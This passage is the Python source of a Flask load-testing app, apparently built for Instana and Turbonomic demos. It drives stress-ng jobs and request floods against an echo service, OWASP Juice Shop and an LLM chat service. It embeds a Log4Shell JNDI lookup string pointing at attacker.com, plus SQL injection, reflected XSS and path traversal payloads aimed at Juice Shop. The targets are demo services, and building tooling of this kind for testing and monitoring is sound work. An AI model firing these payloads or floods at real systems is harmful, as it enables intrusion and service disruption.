#!/usr/bin/env python3
"""
Load Testing Application v3.2 for Turbonomic and Instana Testing
Sophisticated load generator with continuous stress patterns, echo service
integration, and real-time metrics.
"""

import os
import time
import json
import uuid
import math
import logging
import subprocess
import threading
from collections import deque
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string
import psutil
import requests

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ---------------------------------------------------------------------------
# Configuration from environment
# ---------------------------------------------------------------------------
POD_NAME = os.environ.get("POD_NAME", "unknown-pod")
POD_NAMESPACE = os.environ.get("POD_NAMESPACE", "load-testing")
NODE_NAME = os.environ.get("NODE_NAME", "unknown-node")
ECHO_SERVICE_URL = os.environ.get('ECHO_SERVICE_URL', 'http://vulnerable-echo-service:8085')
JUICE_SHOP_URL = os.environ.get('JUICE_SHOP_URL', 'http://juice-shop-service')
CHAT_SERVICE_URL = os.environ.get('CHAT_SERVICE_URL', 'http://chat-service')
# Loopback to our own HTTP API. Background flood loops call THIS instead of the
# downstream services directly, so every flood request enters through WSGI and
# gets a proper Instana entry span -> the downstream call is then linked into
# one end-to-end distributed trace (load-test-app -> echo/juice) instead of
# arriving at the backend as an orphan root trace.
SELF_URL = os.environ.get('SELF_URL', f"http://127.0.0.1:{os.environ.get('PORT', '8080')}")

# ---------------------------------------------------------------------------
# Thread-safe metrics store
# ---------------------------------------------------------------------------
_metrics_lock = threading.Lock()

metrics = {
    'requests_total': 0,
    'stress_tests_started': 0,
    'stress_tests_completed': 0,
    'stress_tests_failed': 0,
    'echo_requests_total': 0,
    'echo_requests_success': 0,
    'echo_requests_failed': 0,
    'echo_flood_requests': 0,
    'juice_requests_total': 0,
    'juice_requests_success': 0,
    'juice_requests_failed': 0,
    'juice_flood_requests': 0,
    'chat_requests_total': 0,
    'chat_requests_success': 0,
    'chat_requests_failed': 0,
    'chat_flood_requests': 0,
    'last_chat_response_time_ms': 0.0,
    'cpu_usage': 0.0,
    'memory_usage': 0.0,
    'last_echo_response_time_ms': 0.0,
    'avg_echo_response_time_ms': 0.0,
    'last_juice_response_time_ms': 0.0,
    'avg_juice_response_time_ms': 0.0,
}

# Rolling window of echo response times for averages
_echo_times = deque(maxlen=500)
_juice_times = deque(maxlen=500)

def inc_metric(key, value=1):
    with _metrics_lock:
        metrics[key] = metrics.get(key, 0) + value

def set_metric(key, value):
    with _metrics_lock:
        metrics[key] = value

def get_metrics_snapshot():
    with _metrics_lock:
        return dict(metrics)

# ---------------------------------------------------------------------------
# Active jobs registry (thread-safe)
# ---------------------------------------------------------------------------
_jobs_lock = threading.Lock()
_active_jobs = {}   # job_id -> {type, params, started, thread, process, ...}

def register_job(job_id, job_type, params, thread=None, process=None):
    with _jobs_lock:
        _active_jobs[job_id] = {
            'type': job_type,
            'params': params,
            'started': datetime.now().isoformat(),
            'thread': thread,
            'process': process,
            'stop_event': threading.Event(),
        }
    return _active_jobs[job_id]

def unregister_job(job_id):
    with _jobs_lock:
        _active_jobs.pop(job_id, None)

def get_active_jobs_info():
    with _jobs_lock:
        return [
            {
                'job_id': jid,
                'type': j['type'],
                'params': j['params'],
                'started': j['started'],
                'running': j['thread'].is_alive() if j.get('thread') else False,
            }
            for jid, j in _active_jobs.items()
        ]

def active_stress_count():
    with _jobs_lock:
        return sum(1 for j in _active_jobs.values()
                   if j['type'] in ('stress', 'ramp', 'wave') and
                   j.get('thread') and j['thread'].is_alive())

# ---------------------------------------------------------------------------
# System metrics collector
# ---------------------------------------------------------------------------
def collect_system_metrics():
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        mem = psutil.virtual_memory()
        set_metric('cpu_usage', cpu)
        set_metric('memory_usage', mem.percent)
        return {
            'cpu_percent': cpu,
            'memory_percent': mem.percent,
            'memory_available_gb': round(mem.available / (1024**3), 2),
            'memory_total_gb': round(mem.total / (1024**3), 2),
            'cpu_count': psutil.cpu_count(),
            'timestamp': datetime.now().isoformat(),
        }
    except Exception as e:
        logger.error(f"Error collecting system metrics: {e}")
        return {}

def _metrics_loop():
    while True:
        try:
            collect_system_metrics()
        except Exception:
            pass
        time.sleep(5)

# ---------------------------------------------------------------------------
# stress-ng runner (non-blocking)
# ---------------------------------------------------------------------------
MAX_CONCURRENT_STRESS = 8

def _run_stress_ng_job(job_id, cpu_workers, memory_workers, duration, memory_size):
    """Run stress-ng in a background thread. Non-blocking.

    cpu_workers: Number of CPU workers (0 = auto-detect all CPUs, >0 = specific count)
    Uses aggressive CPU methods to ensure high utilization.
    """
    env = os.environ.copy()
    env['TMPDIR'] = '/tmp'
    popen_kwargs = dict(
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
        cwd='/tmp', env=env,
    )

    # Use specified workers or auto-detect (0)
    cpu_count = str(cpu_workers) if cpu_workers > 0 else '0'
    
    cmd = [
        'stress-ng',
        '--temp-path', '/tmp',
        '--cpu', cpu_count,
        '--cpu-method', 'all',  # Use all CPU stress methods for maximum load
        '--timeout', f'{duration}s',
        '--metrics-brief',
        '--aggressive',  # More aggressive CPU usage
    ]

    # Add memory stressor if requested
    if memory_workers > 0:
        cmd.extend([
            '--vm', str(memory_workers),
            '--vm-bytes', memory_size,
            '--vm-method', 'all',  # Use all memory stress methods
        ])

    logger.info(f"[{job_id}] Starting stress-ng (--cpu {cpu_count}, {duration}s): {' '.join(cmd)}")
    inc_metric('stress_tests_started')

    try:
        process = subprocess.Popen(cmd, **popen_kwargs)
        with _jobs_lock:
            if job_id in _active_jobs:
                _active_jobs[job_id]['process'] = process

        output, _ = process.communicate()

        if process.returncode == 0:
            inc_metric('stress_tests_completed')
            logger.info(f"[{job_id}] stress-ng finished successfully after {duration}s")
        else:
            logger.warning(f"[{job_id}] stress-ng failed (code {process.returncode})")
            logger.warning(f"[{job_id}] output: {output[:500] if output else 'none'}")
            # Retry CPU-only (drop memory stressor which may cause failures)
            cmd_cpu = [
                'stress-ng',
                '--temp-path', '/tmp',
                '--cpu', '0',
                '--timeout', f'{duration}s',
                '--metrics-brief',
            ]
            logger.info(f"[{job_id}] Retrying CPU-only: {' '.join(cmd_cpu)}")
            process2 = subprocess.Popen(cmd_cpu, **popen_kwargs)
            with _jobs_lock:
                if job_id in _active_jobs:
                    _active_jobs[job_id]['process'] = process2
            output2, _ = process2.communicate()
            if process2.returncode == 0:
                inc_metric('stress_tests_completed')
                logger.info(f"[{job_id}] stress-ng CPU-only finished successfully")
            else:
                inc_metric('stress_tests_failed')
                logger.warning(f"[{job_id}] stress-ng CPU-only also failed (code {process2.returncode})")
                logger.warning(f"[{job_id}] output: {output2[:500] if output2 else 'none'}")

    except FileNotFoundError:
        inc_metric('stress_tests_failed')
        logger.error(f"[{job_id}] stress-ng not installed")
    except Exception as e:
        inc_metric('stress_tests_failed')
        logger.error(f"[{job_id}] stress-ng error: {e}")
    finally:
        unregister_job(job_id)


def start_stress(cpu_workers=2, memory_workers=1, duration=30, memory_size="256M"):
    """Start a stress test (non-blocking). Returns job_id."""
    if active_stress_count() >= MAX_CONCURRENT_STRESS:
        return None, "Maximum concurrent stress tests reached"

    job_id = f"stress-{uuid.uuid4().hex[:8]}"
    params = dict(cpu_workers=cpu_workers, memory_workers=memory_workers,
                  duration=duration, memory_size=memory_size)
    t = threading.Thread(target=_run_stress_ng_job, daemon=True,
                         args=(job_id, cpu_workers, memory_workers, duration, memory_size))
    register_job(job_id, 'stress', params, thread=t)
    t.start()
    return job_id, None

# ---------------------------------------------------------------------------
# Ramp pattern: linearly increase CPU workers over time
# ---------------------------------------------------------------------------
def _run_ramp_job(job_id, max_workers, step_duration, steps, memory_size):
    """Ramp up CPU load step by step."""
    logger.info(f"[{job_id}] Starting ramp: {steps} steps, max_workers={max_workers}")
    inc_metric('stress_tests_started')
    job = _active_jobs.get(job_id)

    try:
        for step in range(1, steps + 1):
            if job and job['stop_event'].is_set():
                logger.info(f"[{job_id}] Ramp stopped at step {step}")
                break

            workers = max(1, min(int(max_workers * step / steps), 4))
            cmd = [
                'stress-ng', '--temp-path', '/tmp',
                '--cpu', str(workers),
                '--cpu-method', 'matrixprod',
                '--timeout', f'{step_duration}s',
                '--metrics-brief',
            ]
            logger.info(f"[{job_id}] Ramp step {step}/{steps}: {workers} CPU workers")

            env = os.environ.copy()
            env['TMPDIR'] = '/tmp'
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True,
                                    cwd='/tmp', env=env)
            with _jobs_lock:
                if job_id in _active_jobs:
                    _active_jobs[job_id]['process'] = proc

            proc.communicate()

        inc_metric('stress_tests_completed')
        logger.info(f"[{job_id}] Ramp completed")
    except Exception as e:
        inc_metric('stress_tests_failed')
        logger.error(f"[{job_id}] Ramp error: {e}")
    finally:
        unregister_job(job_id)


def start_ramp(max_workers=8, step_duration=15, steps=5, memory_size="256M"):
    if active_stress_count() >= MAX_CONCURRENT_STRESS:
        return None, "Maximum concurrent stress tests reached"
    job_id = f"ramp-{uuid.uuid4().hex[:8]}"
    params = dict(max_workers=max_workers, step_duration=step_duration,
                  steps=steps, memory_size=memory_size)
    t = threading.Thread(target=_run_ramp_job, daemon=True,
                         args=(job_id, max_workers, step_duration, steps, memory_size))
    register_job(job_id, 'ramp', params, thread=t)
    t.start()
    return job_id, None

# ---------------------------------------------------------------------------
# Wave / sine pattern: oscillating CPU load
# ---------------------------------------------------------------------------
def _run_wave_job(job_id, max_workers, period_sec, total_duration, memory_size):
    """Generate a sine-wave CPU load pattern."""
    logger.info(f"[{job_id}] Starting wave: period={period_sec}s, duration={total_duration}s")
    inc_metric('stress_tests_started')
    job = _active_jobs.get(job_id)
    step_len = 10  # seconds per sub-step

    try:
        elapsed = 0
        while elapsed < total_duration:
            if job and job['stop_event'].is_set():
                break

            # Sine wave: 1 .. max_workers
            frac = (math.sin(2 * math.pi * elapsed / period_sec) + 1) / 2
            workers = max(1, min(int(frac * max_workers), 4))
            remaining = min(step_len, total_duration - elapsed)

            cmd = [
                'stress-ng', '--temp-path', '/tmp',
                '--cpu', str(workers),
                '--cpu-method', 'matrixprod',
                '--timeout', f'{remaining}s',
            ]
            logger.info(f"[{job_id}] Wave t={elapsed}s: {workers} CPU workers")

            env = os.environ.copy()
            env['TMPDIR'] = '/tmp'
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True,
                                    cwd='/tmp', env=env)
            with _jobs_lock:
                if job_id in _active_jobs:
                    _active_jobs[job_id]['process'] = proc
            proc.communicate()

            elapsed += remaining

        inc_metric('stress_tests_completed')
        logger.info(f"[{job_id}] Wave completed")
    except Exception as e:
        inc_metric('stress_tests_failed')
        logger.error(f"[{job_id}] Wave error: {e}")
    finally:
        unregister_job(job_id)


def start_wave(max_workers=8, period_sec=60, total_duration=120, memory_size="256M"):
    if active_stress_count() >= MAX_CONCURRENT_STRESS:
        return None, "Maximum concurrent stress tests reached"
    job_id = f"wave-{uuid.uuid4().hex[:8]}"
    params = dict(max_workers=max_workers, period_sec=period_sec,
                  total_duration=total_duration, memory_size=memory_size)
    t = threading.Thread(target=_run_wave_job, daemon=True,
                         args=(job_id, max_workers, period_sec, total_duration, memory_size))
    register_job(job_id, 'wave', params, thread=t)
    t.start()
    return job_id, None

# ---------------------------------------------------------------------------
# Echo service caller
# ---------------------------------------------------------------------------
def call_echo_service(message, method='POST', vulnerable_payload=False):
    """Call the vulnerable echo service once."""
    start = time.time()

    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'LoadTestApp/3.2',
        }

        if vulnerable_payload:
            vuln_str = "${jndi:ldap://attacker.com/exploit}"
            headers['X-Vulnerable-Header'] = vuln_str
            headers['X-Log4j-Test'] = vuln_str
            message = f"{message} - VULNERABLE: {vuln_str}"

        if method.upper() == 'POST':
            resp = requests.post(
                f"{ECHO_SERVICE_URL}/echo",
                json={'message': message, 'timestamp': datetime.now().isoformat()},
                headers=headers, timeout=10,
            )
        else:
            resp = requests.get(
                f"{ECHO_SERVICE_URL}/echo",
                params={'message': message},
                headers=headers, timeout=10,
            )

        elapsed_ms = round((time.time() - start) * 1000, 2)
        inc_metric('echo_requests_total')
        _echo_times.append(elapsed_ms)
        set_metric('last_echo_response_time_ms', elapsed_ms)
        if _echo_times:
            set_metric('avg_echo_response_time_ms',
                        round(sum(_echo_times) / len(_echo_times), 2))

        if resp.status_code == 200:
            inc_metric('echo_requests_success')
            try:
                body = resp.json()
            except ValueError:
                body = {'raw': resp.text}
            return {
                'success': True, 'response': body,
                'status_code': 200, 'method': method,
                'vulnerable_payload': vulnerable_payload,
                'response_time_ms': elapsed_ms,
            }
        else:
            inc_metric('echo_requests_failed')
            return {
                'success': False, 'error': f"HTTP {resp.status_code}: {resp.text}",
                'status_code': resp.status_code,
                'response_time_ms': elapsed_ms, 'method': method,
            }

    except requests.RequestException as e:
        elapsed_ms = round((time.time() - start) * 1000, 2)
        inc_metric('echo_requests_total')
        inc_metric('echo_requests_failed')
        return {
            'success': False, 'error': str(e),
            'response_time_ms': elapsed_ms, 'method': method,
        }

# ---------------------------------------------------------------------------
# Echo flood: sustained echo service load
# ---------------------------------------------------------------------------
def _run_echo_flood(job_id, rps, duration, vulnerable):
    """Send sustained requests to echo service."""
    logger.info(f"[{job_id}] Starting echo flood: {rps} rps for {duration}s")
    job = _active_jobs.get(job_id)
    delay = 1.0 / max(rps, 1)
    end_time = time.time() + duration
    count = 0

    try:
        while time.time() < end_time:
            if job and job['stop_event'].is_set():
                break
            # Call our own /api/echo endpoint over HTTP (not call_echo_service
            # directly) so the request enters through WSGI and Instana records a
            # full end-to-end trace: load-test-app -> vulnerable-echo-service.
            try:
                requests.post(
                    f"{SELF_URL}/api/echo",
                    json={'message': f"flood-{count} from {POD_NAME}",
                          'method': 'POST',
                          'vulnerable_payload': 'true' if vulnerable else 'false'},
                    timeout=10,
                )
            except Exception as e:
                logger.debug(f"[{job_id}] echo flood iteration error: {e}")
            inc_metric('echo_flood_requests')
            count += 1
            time.sleep(delay)

        logger.info(f"[{job_id}] Echo flood finished: {count} requests sent")
    except Exception as e:
        logger.error(f"[{job_id}] Echo flood error: {e}")
    finally:
        unregister_job(job_id)


def start_echo_flood(rps=5, duration=60, vulnerable=False):
    job_id = f"flood-{uuid.uuid4().hex[:8]}"
    params = dict(rps=rps, duration=duration, vulnerable=vulnerable)
    t = threading.Thread(target=_run_echo_flood, daemon=True,
                         args=(job_id, rps, duration, vulnerable))
    register_job(job_id, 'echo_flood', params, thread=t)
    t.start()
    return job_id, None

# ---------------------------------------------------------------------------
# Juice Shop interactions (OWASP Juice Shop demo vulnerable application)
# ---------------------------------------------------------------------------
JUICE_ACTIONS = {
    'browse':        {'method': 'GET',  'path': '/',                                 'desc': 'Load Juice Shop main page'},
    'products':      {'method': 'GET',  'path': '/api/Products',                     'desc': 'List products via REST API'},
    'search':        {'method': 'GET',  'path': '/rest/products/search?q=apple',     'desc': 'Search products (clean)'},
    'feedbacks':     {'method': 'GET',  'path': '/api/Feedbacks',                    'desc': 'List feedbacks via REST API'},
    'users':         {'method': 'GET',  'path': '/api/Users',                        'desc': 'Enumerate users (IDOR)'},
    'challenges':    {'method': 'GET',  'path': '/api/Challenges',                   'desc': 'List CTF challenges'},
    'sqli_login':    {'method': 'POST', 'path': '/rest/user/login',
                      'body': {'email': "' OR 1=1--", 'password': 'anything'},       'desc': 'SQL injection login bypass'},
    'xss_search':    {'method': 'GET',  'path': "/rest/products/search?q=<iframe%20src=\"javascript:alert(`xss`)\">",
                      'desc': 'Reflected XSS via search'},
    'path_traversal':{'method': 'GET',  'path': '/ftp/../package.json',              'desc': 'Path traversal attempt'},
    'admin_section': {'method': 'GET',  'path': '/#/administration',                 'desc': 'Hit admin section'},
}


def call_juice_shop(action='browse'):
    """Call Juice Shop with a predefined action (browse / attack / etc.)."""
    cfg = JUICE_ACTIONS.get(action, JUICE_ACTIONS['browse'])
    start = time.time()

    try:
        headers = {
            'User-Agent': 'LoadTestApp/3.2',
            'Accept': 'application/json, text/html, */*',
        }
        url = f"{JUICE_SHOP_URL}{cfg['path']}"

        if cfg['method'] == 'POST':
            resp = requests.post(
                url, json=cfg.get('body', {}), headers=headers, timeout=10,
            )
        else:
            resp = requests.get(url, headers=headers, timeout=10)

        elapsed_ms = round((time.time() - start) * 1000, 2)
        inc_metric('juice_requests_total')
        _juice_times.append(elapsed_ms)
        set_metric('last_juice_response_time_ms', elapsed_ms)
        if _juice_times:
            set_metric('avg_juice_response_time_ms',
                        round(sum(_juice_times) / len(_juice_times), 2))

        if resp.status_code < 500:
            inc_metric('juice_requests_success')
            # Trim long HTML responses
            preview = resp.text[:400] if resp.text else ''
            return {
                'success': True,
                'action': action, 'description': cfg['desc'],
                'method': cfg['method'], 'url': url,
                'status_code': resp.status_code,
                'response_preview': preview,
                'response_time_ms': elapsed_ms,
            }
        else:
            inc_metric('juice_requests_failed')
            return {
                'success': False,
                'action': action, 'description': cfg['desc'],
                'error': f"HTTP {resp.status_code}",
                'status_code': resp.status_code,
                'response_time_ms': elapsed_ms,
            }

    except requests.RequestException as e:
        elapsed_ms = round((time.time() - start) * 1000, 2)
        inc_metric('juice_requests_total')
        inc_metric('juice_requests_failed')
        return {
            'success': False, 'action': action,
            'description': cfg['desc'],
            'error': str(e), 'response_time_ms': elapsed_ms,
        }


def _run_juice_flood(job_id, rps, duration, action):
    """Send sustained requests to Juice Shop."""
    logger.info(f"[{job_id}] Starting juice flood: {rps} rps for {duration}s, action={action}")
    job = _active_jobs.get(job_id)
    delay = 1.0 / max(rps, 1)
    end_time = time.time() + duration
    count = 0

    # If action is "mixed", rotate through a curated set of actions
    rotation = ['browse', 'products', 'search', 'feedbacks', 'users',
                'sqli_login', 'xss_search'] if action == 'mixed' else None

    try:
        while time.time() < end_time:
            if job and job['stop_event'].is_set():
                break
            act = rotation[count % len(rotation)] if rotation else action
            # Call our own /api/juice endpoint over HTTP so the flood request is
            # traced end-to-end (load-test-app -> juice-shop) instead of arriving
            # at Juice Shop as an orphan root trace.
            try:
                requests.post(f"{SELF_URL}/api/juice",
                              json={'action': act}, timeout=10)
            except Exception as e:
                logger.debug(f"[{job_id}] juice flood iteration error: {e}")
            inc_metric('juice_flood_requests')
            count += 1
            time.sleep(delay)

        logger.info(f"[{job_id}] Juice flood finished: {count} requests sent")
    except Exception as e:
        logger.error(f"[{job_id}] Juice flood error: {e}")
    finally:
        unregister_job(job_id)


def start_juice_flood(rps=5, duration=60, action='mixed'):
    job_id = f"juice-{uuid.uuid4().hex[:8]}"
    params = dict(rps=rps, duration=duration, action=action)
    t = threading.Thread(target=_run_juice_flood, daemon=True,
                         args=(job_id, rps, duration, action))
    register_job(job_id, 'juice_flood', params, thread=t)
    t.start()
    return job_id, None

# ---------------------------------------------------------------------------
# LLM Chat service caller — drives the chat-app (-> vLLM/Ollama/OpenAI).
# The chat-app continues the distributed trace (W3C traceparent), so this
# produces an end-to-end trace: load-test-app -> chat-app -> LLM, with the
# GenAI/LLM span (Traceloop) visible under the loadgen application in Instana.
# ---------------------------------------------------------------------------
DEFAULT_CHAT_PROMPTS = [
    "In one sentence, what is observability?",
    "Give me a one-line tip for Kubernetes troubleshooting.",
    "Explain distributed tracing in one sentence.",
    "What is APM? Answer in one short sentence.",
    "One sentence: why monitor CPU and memory?",
]

def call_chat_service(prompt, model=None):
    """POST a prompt to the chat-app /api/chat. requests is Instana-instrumented,
    so trace context propagates to chat-app and on to the LLM."""
    start = time.time()
    payload = {'messages': [{'role': 'user', 'content': prompt}]}
    if model:
        payload['model'] = model
    try:
        resp = requests.post(f"{CHAT_SERVICE_URL}/api/chat", json=payload, timeout=120)
        elapsed_ms = round((time.time() - start) * 1000, 2)
        inc_metric('chat_requests_total')
        set_metric('last_chat_response_time_ms', elapsed_ms)
        if resp.status_code == 200:
            inc_metric('chat_requests_success')
            body = resp.json()
            return {'success': True, 'prompt': prompt,
                    'reply': body.get('reply'), 'model': body.get('model'),
                    'usage': body.get('usage'), 'response_time_ms': elapsed_ms}
        inc_metric('chat_requests_failed')
        return {'success': False, 'prompt': prompt,
                'error': f"HTTP {resp.status_code}: {resp.text[:200]}",
                'response_time_ms': elapsed_ms}
    except requests.RequestException as e:
        elapsed_ms = round((time.time() - start) * 1000, 2)
        inc_metric('chat_requests_total')
        inc_metric('chat_requests_failed')
        return {'success': False, 'prompt': prompt, 'error': str(e),
                'response_time_ms': elapsed_ms}


def _run_chat_flood(job_id, rpm, duration, prompt):
    """Chat load paced in requests per MINUTE.

    LLM calls routinely take seconds, so a per-second rate is meaningless here.
    The wait is measured from the start of each call, so a slow call consumes
    its interval instead of adding to it: at 6/min you get one call every 10s
    whether the model answers in 1s or 8s. If a call outruns the interval the
    next one starts immediately (no negative sleep, no pile-up).
    """
    interval = 60.0 / max(float(rpm), 0.2)
    logger.info(f"[{job_id}] Starting chat flood: {rpm} req/min "
                f"(one every {interval:.1f}s) for {duration}s")
    job = _active_jobs.get(job_id)
    end_time = time.time() + duration
    count = 0
    try:
        while time.time() < end_time:
            if job and job['stop_event'].is_set():
                break
            p = prompt or DEFAULT_CHAT_PROMPTS[count % len(DEFAULT_CHAT_PROMPTS)]
            started = time.time()
            # Loop back through our own /api/chatllm so the request enters WSGI
            # (Instana entry span) -> chat-app -> LLM as one end-to-end trace.
            try:
                requests.post(f"{SELF_URL}/api/chatllm",
                              json={'prompt': p}, timeout=300)
            except Exception as e:
                logger.debug(f"[{job_id}] chat flood iteration error: {e}")
            inc_metric('chat_flood_requests')
            count += 1
            time.sleep(max(0.0, interval - (time.time() - started)))
        logger.info(f"[{job_id}] Chat flood finished: {count} requests sent")
    except Exception as e:
        logger.error(f"[{job_id}] Chat flood error: {e}")
    finally:
        unregister_job(job_id)


def start_chat_flood(rpm=6, duration=300, prompt=None):
    job_id = f"chat-{uuid.uuid4().hex[:8]}"
    params = dict(rpm=rpm, duration=duration, prompt=prompt or '(rotating)')
    t = threading.Thread(target=_run_chat_flood, daemon=True,
                         args=(job_id, rpm, duration, prompt))
    register_job(job_id, 'chat_flood', params, thread=t)
    t.start()
    return job_id, None

# ---------------------------------------------------------------------------
# Cluster status via Kubernetes API (optional) + kubectl top pods
# ---------------------------------------------------------------------------
def get_cluster_stress_status():
    try:
        from kubernetes import client, config as k8s_config
        k8s_config.load_incluster_config()
    except Exception:
        return {'error': True, 'details': 'Not running in cluster or kubernetes package unavailable'}

    try:
        v1 = client.CoreV1Api()
        pods = v1.list_namespaced_pod(
            namespace=POD_NAMESPACE, label_selector="app=load-test-app"
        )
    except Exception as e:
        return {'error': True, 'details': str(e)}

    per_pod = []
    pod_resources = []
    per_node = {}
    total = 0
    for pod in pods.items:
        pip = pod.status.pod_ip
        if not pip:
            continue
        try:
            r = requests.get(f"http://{pip}:8080/status", timeout=2)
            if r.status_code != 200:
                continue
            data = r.json()
            active = data.get('active_jobs', 0)
            total += active
            pod_jobs = data.get('jobs', [])
            per_pod.append({
                'pod_name': pod.metadata.name,
                'node_name': pod.spec.node_name,
                'active_jobs': active,
                'jobs': pod_jobs,
            })
            m = data.get('metrics', {})
            s = data.get('system', {})
            pod_resources.append({
                'name': pod.metadata.name,
                'node': pod.spec.node_name,
                'cpu_percent': m.get('cpu_usage', 0),
                'memory_percent': m.get('memory_usage', 0),
                'memory_total_gb': s.get('memory_total_gb', 0),
                'cpu_count': s.get('cpu_count', 0),
            })
            per_node[pod.spec.node_name] = per_node.get(pod.spec.node_name, 0) + active
        except Exception:
            continue

    return {
        'error': False,
        'cluster_total': total,
        'per_pod': per_pod,
        'pod_resources': pod_resources,
        'per_node': per_node,
        'namespace': POD_NAMESPACE,
        'timestamp': datetime.now().isoformat(),
    }

# ---------------------------------------------------------------------------
# Stop helpers
# ---------------------------------------------------------------------------
def stop_all_jobs():
    """Gracefully stop all running jobs."""
    stopped = 0
    with _jobs_lock:
        for jid, job in list(_active_jobs.items()):
            job['stop_event'].set()
            proc = job.get('process')
            if proc and proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
            stopped += 1
        _active_jobs.clear()
    return stopped


def stop_job(job_id):
    with _jobs_lock:
        job = _active_jobs.get(job_id)
        if not job:
            return False
        job['stop_event'].set()
        proc = job.get('process')
        if proc and proc.poll() is None:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        _active_jobs.pop(job_id, None)
    return True


# ============================================================================
# HTML TEMPLATE
# ============================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Load Testing App v3.2</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1100px; margin: 0 auto; }
        .header {
            text-align: center; padding: 30px 0 20px;
        }
        .header h1 {
            font-size: 2.2em; color: #00d2ff;
            text-shadow: 0 0 20px rgba(0,210,255,0.3);
        }
        .header .sub { color: #8899a6; margin-top: 8px; font-size: 1.05em; }
        .header .pod-info {
            margin-top: 10px; font-size: 0.9em; color: #5c6d7e;
            font-family: monospace;
        }

        /* Cards */
        .card {
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 20px;
            backdrop-filter: blur(10px);
        }
        .card h2 {
            font-size: 1.3em; color: #00d2ff; margin-bottom: 16px;
            border-bottom: 1px solid rgba(0,210,255,0.2);
            padding-bottom: 10px;
        }

        /* Metrics grid */
        .mgrid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px;
        }
        .mbox {
            background: rgba(0,210,255,0.08);
            border: 1px solid rgba(0,210,255,0.15);
            border-radius: 8px;
            padding: 14px 10px; text-align: center;
        }
        .mbox .val { font-size: 1.6em; font-weight: 700; color: #00d2ff; }
        .mbox .lbl { font-size: 0.78em; color: #8899a6; margin-top: 4px; }

        /* Active jobs */
        .job-row {
            display: flex; align-items: center; justify-content: space-between;
            padding: 10px 14px; margin: 6px 0;
            background: rgba(255,255,255,0.04); border-radius: 6px;
            font-size: 0.92em;
        }
        .job-row .tag {
            display: inline-block; padding: 2px 10px; border-radius: 12px;
            font-size: 0.8em; font-weight: 600; text-transform: uppercase;
        }
        .tag-stress { background: #e74c3c33; color: #e74c3c; }
        .tag-ramp   { background: #f39c1233; color: #f39c12; }
        .tag-wave   { background: #9b59b633; color: #9b59b6; }
        .tag-flood  { background: #2ecc7133; color: #2ecc71; }
        .tag-chat_flood { background: #1abc9c33; color: #1abc9c; }

        /* Forms */
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
        }
        .fg { margin-bottom: 14px; }
        .fg label { display: block; font-size: 0.85em; color: #8899a6; margin-bottom: 6px; font-weight: 600; }
        .fg input, .fg select {
            width: 100%; padding: 10px 12px;
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.15);
            border-radius: 6px; color: #e0e0e0;
            font-size: 0.95em;
        }
        .fg input:focus, .fg select:focus {
            outline: none; border-color: #00d2ff;
            box-shadow: 0 0 0 2px rgba(0,210,255,0.2);
        }
        .fg input[type="checkbox"] { width: auto; margin-right: 8px; }
        .cb-row { display: flex; align-items: center; margin: 10px 0; }

        /* Buttons */
        .btn {
            display: inline-block; padding: 10px 22px;
            border: none; border-radius: 6px;
            font-size: 0.95em; font-weight: 600;
            cursor: pointer; transition: all 0.2s;
            margin: 4px;
        }
        .btn:hover { transform: translateY(-1px); filter: brightness(1.15); }
        .btn-primary { background: linear-gradient(135deg, #00d2ff, #0083b0); color: #fff; }
        .btn-danger  { background: linear-gradient(135deg, #e74c3c, #c0392b); color: #fff; }
        .btn-warning { background: linear-gradient(135deg, #f39c12, #d68910); color: #1a1a2e; }
        .btn-success { background: linear-gradient(135deg, #2ecc71, #27ae60); color: #fff; }
        .btn-purple  { background: linear-gradient(135deg, #9b59b6, #8e44ad); color: #fff; }
        .btn-sm { padding: 6px 14px; font-size: 0.82em; }

        /* Tabs */
        .tabs { display: flex; gap: 4px; margin-bottom: 18px; flex-wrap: wrap; }
        .tab {
            padding: 8px 18px; border-radius: 6px 6px 0 0;
            background: rgba(255,255,255,0.05); color: #8899a6;
            cursor: pointer; font-size: 0.9em; font-weight: 600;
            border: 1px solid transparent; border-bottom: none;
        }
        .tab.active { background: rgba(0,210,255,0.1); color: #00d2ff; border-color: rgba(0,210,255,0.2); }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* API section */
        .endpoint {
            padding: 8px 14px; margin: 4px 0; border-radius: 4px;
            background: rgba(255,255,255,0.04);
            font-family: 'Courier New', monospace; font-size: 0.88em;
        }
        .endpoint .method {
            display: inline-block; width: 50px;
            font-weight: 700; color: #2ecc71;
        }
        .endpoint .method.post { color: #f39c12; }

        .status-banner {
            padding: 14px; border-radius: 6px; margin: 10px 0;
            font-size: 0.92em;
        }
        .status-ok { background: rgba(46,204,113,0.15); border: 1px solid rgba(46,204,113,0.3); color: #2ecc71; }
        .status-err { background: rgba(231,76,60,0.15); border: 1px solid rgba(231,76,60,0.3); color: #e74c3c; }
